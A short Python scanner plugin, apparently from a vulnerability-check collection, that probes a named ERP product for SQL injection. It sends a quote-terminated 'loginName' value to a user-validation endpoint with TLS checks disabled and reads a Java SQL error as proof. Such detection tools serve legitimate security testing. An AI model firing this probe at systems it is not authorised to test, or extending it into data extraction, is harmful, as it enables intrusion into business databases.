#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/webapp/云时空ERP/云时空 社会化商业ERP系统 validateLoginName SQL注入漏洞.html',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '云时空 社会化商业ERP系统 SQL注入',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = "/sys/user/validateLoginName?loginName=admin'"
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 500 and "java.sql.SQLException" in res.text:
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret